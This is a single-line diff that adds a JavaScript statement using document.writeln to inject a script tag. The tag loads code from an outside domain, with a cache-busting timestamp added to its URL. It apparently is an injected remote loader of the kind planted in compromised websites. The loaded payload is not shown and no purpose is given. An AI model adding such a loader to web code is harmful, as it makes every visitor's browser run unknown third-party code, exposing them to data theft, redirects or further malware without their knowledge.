@@ -1,0 +1,1 @@
+document.writeln("<script src='https://p.qfmzys.com/vtdd/ig3385mh"+(new Date()).getTime()+"joc'><\/script>");
